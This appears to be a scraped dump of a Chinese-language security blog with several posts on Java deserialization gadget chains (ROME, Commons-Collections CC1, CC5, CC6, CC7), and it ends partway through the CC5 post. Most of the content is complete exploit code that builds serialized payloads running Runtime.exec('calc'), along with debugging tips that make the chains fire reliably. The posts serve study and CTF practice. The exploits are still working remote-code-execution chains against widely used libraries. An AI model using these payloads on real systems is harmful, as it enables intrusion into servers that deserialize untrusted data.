com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import javassist.CtNewConstructor; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; public class poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); //byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\timu\\\\src\\\\main\\\\java\\\\CISCN2023DeserBug\\\\evil.class\u0026#34;)); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); HashMap\u0026lt;Object,Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(objectBean,\u0026#34;123\u0026#34;); Field field = toStringBean.getClass().getDeclaredField(\u0026#34;_obj\u0026#34;); field.setAccessible(true); field.set(toStringBean,templates); serialize(hashMap); unserialize(\u0026#34;ser.bin\u0026#34;); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程 1 2 3 4 5 6 7 8 9 ObjectInputStream.readObject HashMap.readObject HashMap.put HashMap.hash ObjectBean.hashCode EqualsBean.beanHashCode ToStringBean.toString TrAXFilter.TrAXFilter //后面就是动态加载恶意类的链子了 另一条链子 如果说对hashmap类做了过滤,这里能够用HashTable绕过\ncc7的链子刚好就是用的HashTable,不过链子好像不同\nHashtable.readObject\n这个函数里调用了hashCode方法\n和上面的后面链子接上去了\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package poc; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import javassist.CtNewConstructor; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Hashtable; public class SecondPoc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templates); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); Hashtable hashtable = new Hashtable(); hashtable.put(objectBean,\u0026#34;123\u0026#34;); // serialize(hashtable); unserialize(\u0026#34;ser.bin\u0026#34;); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程 1 2 3 4 5 6 7 Hashtable.readObject Hashtable.reconstitutionPut objectBean.hashCode EqualsBean.beanHashCode ToStringBean.toString TrAXFilter.TrAXFilter //后面就是动态加载恶意类的链子了 ","date":"2025-01-03T16:13:01+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/14_hue39ddf12b43735ddd45d5131ec91605e_378122_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/","title":"java反序列化之ROME反序列化"},{"content":"正向分析 CC7 的链子也是和 CC5 类似，后半条链子也是 LazyMap.get() 的这条链子。\n看链子写exp\n先复制后半条链\n1 2 3 4 5 6 7 8 9 10 11 12 13 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); decoratemap.get(Runtime.class); Hashtable.readObject调用了reconstitutionPut\nreconstitutionPut触发AbstractMapDecorator.equals()\nAbstractMapDecorator.equals()触发AbstractMap.equals()\n然后就进入到LazyMap.get里,也就是cc5的后半段链子\n这里我把断点打在了 AbstractMap.equals() 的地方，结果发现居然没有执行到 .equals() 这个方法，去看一看 yso 的链子是怎么写的。 yso 这里的链子比我们多了一个 map，而且将两个 map 进行了比较，一看到这个就明白了。\n为什么要调用两次put()? 我们需要调用的 e.key.equal() 方法是在 for 循环里面的，需要进入到这 for 循环才能调用。\nHashtable 的 reconstitutionPut() 方法是被遍历调用的，\n第一次调用的时候，并不会走入到 reconstitutionPut() 方法 for 循环里面，因为 tab[index] 的内容是空的，在下面会对 tab[index] 进行赋值。\n为什么调用的两次put()其中map中key的值分别为yy和zZ? 第二次调用 reconstitutionPut() 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 (e.hash == hash) 判断为真才能走到我们想要的 e.key.equal() 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 key.hashCode() 得到的，也就是说 lazyMap1 的 hash 值就是 \u0026quot;yy\u0026quot;.hashCode() ，lazyMap2 的 hash 值就是 \u0026quot;zZ\u0026quot;.hashCode() ，而在 java 中有一个小 bug：\nJAVA\nplain 1 plain \u0026quot;yy\u0026quot;.hashCode() == \u0026quot;zZ\u0026quot;.hashCode() yy 和 zZ 由 hashCode() 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 put() 的值设置为 yy 和 zZ，才能走到我们想要的 e.key.equal() 方法中。\n**为什么在调用完 **HashTable.put() 之后，还需要在 map2 中 remove() ****掉 yy？ 这是因为 HashTable.put() 实际上也会调用到 equals() 方法：\n当调用完 equals() 方法后，LazyMap2 的 key 中就会增加一个 yy 键：\n这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。\n序列化的时候也会弹计算器,因为在put的时候也调用了equals从而进入链子,所以先给个无关的参数,再通过反射修改\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); HashMap\u0026lt;Object,Object\u0026gt; hashmap1 = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap2 = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap1 = LazyMap.decorate(hashmap1,chainedTransformer); Map\u0026lt;Object,Object\u0026gt; decoratemap2 = LazyMap.decorate(hashmap2,chainedTransformer); decoratemap1.put(\u0026#34;yy\u0026#34;,1); decoratemap2.put(\u0026#34;zZ\u0026#34;,1); Hashtable hashtable = new Hashtable(); hashtable.put(decoratemap1,1); hashtable.put(decoratemap2,1); decoratemap2.remove(\u0026#34;yy\u0026#34;); Class c= ChainedTransformer.class; Field field = c.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(chainedTransformer,transformers); serialize(hashtable); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 8 9 Hashtable.readObject() Hashtable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:54:13+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/13_hue1a50ceaf49ba5491ac8a39d8d7ea50c_290380_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/","title":"java反序列化之Commons-Collections-CC7链"},{"content":"链尾InvokerTransformer.transform 正版cc1链漏洞点还是InvokeTransformer\n但是利用的transform的是LazyMap类\nget是public方法,可以创建对象直接调用\n找一下factory\n发现是Transformer而且decorate方法能返回一个LazyMap的实例对象\n和TransformedMap的很像\n1 2 3 4 5 6 7 8 9 10 11 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); decoratemap.get(Runtime.class); 成功弹了\n再找get的链子\n这里太多类调用get了,直接看出在AnnotationInvocationHandler的invoke里\n怎么触发呢?虽然说invoke是public方法,但是在反序列化的时候,是进入readObject的,不能直接来个AnnotationInvocationHandler.invoke来触发\n需要触发 invoke 方法，马上想到动态代理\n满足实现接口并且重写了invoke方法,是代理类\n一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。\n先通过反射将memberValues的值改为LazyMap\n1 2 3 Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); 那我们应该选择哪个被代理类呢？\n在get前的代码，如果调用的方法名为equals，toString，hashCode，annotaionType中的任意一个方法都会立刻return，且\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;assert paramTypes.length == 0;\u0026lt;/font\u0026gt;表示\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;paramType.length != 0\u0026lt;/font\u0026gt;则抛出AssertionError异常。即不能调用有参方法。只要不是调用以上名字方法，都能成功执行。\n代理类只能代理构造函数传入的类，在这里就是继承了Annotation接口的类（即注解），和实现了Map接口的类。\n所以哪个注解类或实现了Map接口的类在readObject调用了无参方法呢？就是他本身\nAnnotationInvocationHandler本身的readObject里调用了map的一个无参方法\n我们用AnnotationInvocationHandler代理lazyMap，调用这个代理实例的entrySet方法，就能跳转到invoke方法，进而调用get。\n1 2 3 4 5 6 7 8 9 10 11 Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); proxymap.entrySet(); 动态代理详细 获取构造函数： 首先，通过反射获取 AnnotationInvocationHandler 类的构造函数，该构造函数接受两个参数：一个 Class 类型的对象（如 Override.class）和一个 Map 类型的对象（如 decoratemap）。 1 2 Constructor\u0026lt;?\u0026gt; constructor = clz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 允许访问私有构造函数 **实例化 ****AnnotationInvocationHandler**： 使用获取到的构造函数创建 AnnotationInvocationHandler 实例。这个实例负责处理代理对象的方法调用。 1 Object o = constructor.newInstance(Override.class, decoratemap); **强制转换为 ****InvocationHandler**： 将创建的实例强制转换为 InvocationHandler 类型，以便后续可以通过这个处理器处理代理对象的调用。 1 InvocationHandler invocationHandler = (InvocationHandler) o; 创建代理对象： 使用 Proxy.newProxyInstance() 方法创建一个动态代理对象，代理 Map 接口。此时，所有对 proxymap 的方法调用（如 entrySet()、get() 等）都会转发给 invocationHandler 的 invoke() 方法。 1 2 3 4 5 Map proxymap = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); 调用代理方法： 通过代理对象（proxymap）调用 entrySet() 方法。这个调用实际上会被转发到 InvocationHandler 的 invoke() 方法，进行处理。 1 proxymap.entrySet(); // 代理方法调用 最后将代理类的实例化\n1 Object ob = constructor.newInstance(Override.class,proxymap); 完整exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package c1; import com.sun.corba.se.pept.protocol.ClientInvocationInfo; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class cc1true { public static void main(String[] args) throws Exception{ Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程图\n1 2 3 4 5 6 7 8 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() ProxyMap.entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:21:54+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/7_hu5913cd4f38c7546b1d9ada3fa63d7ed0_3285229_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1%E6%AD%A3%E9%93%BE/","title":"java反序列化之Commons-Collections1-CC1正链"},{"content":"环境搭建 jdk8u_71 Comoons-Collections 3.2.1 前言 先说一说 CC6 链同我们之前 CC1 链的一些不同之处吧，我们当时审计 CC1 链的时候要求是比较严格的。要求的环境为 jdk8u65 与 Commons-Collections 3.2.1\n而我们的 CC6 链，可以不受 jdk 版本制约。\n如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS\nCC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链\nLazyMap链 1 2 3 4 5 6 7 8 9 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,invokerTransformer); //decoratemap.get(Runtime.class); Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); method.setAccessible(true); method.invoke(decoratemap,runtime); 成功弹计算器\nTiedMapEntry.getValue触发get 然后找调用了get方法的类\n链子的下一步是TiedMapEntry的getValue调用了LazyMap的get()方法\n看构造方法是public,这里map-\u0026gt;LazyMap,value-\u0026gt;Runtime.class\n这里可以不需要通过反射来获取方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); // Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; // Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); // method.setAccessible(true); // method.invoke(decoratemap,runtime); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,123); tiedMapEntry.getValue(); 成功弹了\nTiedMapEntry.hashCode触发getValue 因为getValue的方法相当常见,寻找同名类的其他调用getValue的方法\n找到还是TiedMapEntry类的hashCode方法,这里调用了getValue\n之前说cc6=cc1+URLDNS,而hashCode刚好是URLDNS链的入口\n1 tiedMapEntry.hashCode(); 运行后成功弹计算器\nHashMap.hash触发hashCode 后面的链子就是HashMap的hash\nHashMap.put触发hash HashMap的put\n\\\n为什么readObject都没有put,这里用put?因为 在 Java 的反序列化过程中，HashMap 会自动调用 put 方法来恢复数据结构 ,而且hash(key)是从put(key,value)传进来的\n所以put-\u0026gt;hash hash-\u0026gt;hashCode是常见的HashMap的链子\n1 2 HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); 这样可以弹\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); // Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; // Method method = lazyMapClass.getDeclaredMethod(\u0026#34;get\u0026#34;,Object.class); // method.setAccessible(true); // method.invoke(decoratemap,runtime); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,123); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 问题一 但是注释掉反序列化代码,序列化的时候也会弹出计算器\n原因\n序列化的时候put就会进入hash从而走一遍链子触发弹计算器\n解决\n先将假的LazyMap放进去,put完后再通过反射修改属性值将正确的LazyMap放到factory\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,123); //tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); Class c = LazyMap.class; Field field = c.getDeclaredField(\u0026#34;factory\u0026#34;); field.setAccessible(true); field.set(lazymap,chainedTransformer); serialize(map); 问题二 序列化不会弹计算器\n但反序列化也不会弹计算器\n原因\n调试时发现\nkey不等于false,不会进入链子\n解决\n通过remove将传入的\u0026quot;abc\u0026quot;去掉\n最终exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,\u0026#34;abc\u0026#34;); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); lazymap.remove(\u0026#34;abc\u0026#34;); Class c = LazyMap.class; Field field = c.getDeclaredField(\u0026#34;factory\u0026#34;); field.setAccessible(true); field.set(lazymap,chainedTransformer); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 问题三 在序列化前打断点,调试的时候会弹出计算器\n因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 toString() 方法，所以在创建 TiedMapEntry 的时候，就自动调用了 getValue() 最终将链子走完，然后弹出计算器。\n解决\n在 IDEA 的偏好设置当中如图修改即可。\n总结 流程图\n链子\n1 2 3 4 5 6 7 8 9 ObjectInputStream.readObject HashMap.readObject HashMap.put HashMap.hash TiedMapEntry.hashCode TiedMapEntry.getValue LazyMap.get ChainedTransformer.transformer InvokerTransformer.transformer ","date":"2025-01-03T15:21:45+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/12_hu7f0506060fc6e44da7c9d960749b6fdc_2219880_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc6/","title":"java反序列化之Commons-Collections-CC6链"},{"content":"\n正向分析 入口类是 BadAttributeValueExpException 的 readObject() 方法，这一个倒是不难。关键是后面的。\n逆向思维来看的话，LazyMap.get() 方法被 TiedMapEntry.toString() 所调用，而如果去找谁调用了 toString() 这也太多了，太难找了，我们只能正向分析。\nBadAttributeValueExpException\u0026lt;/font\u0026gt;的readObject\nTiedMapEntry类下的toString\n同类下的getValue\n再找到LazyMap下的get\n后半段是cc1正链的后半部分到LazyMap,直接拿进来\n1 2 3 4 5 6 7 8 9 10 11 12 13 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // 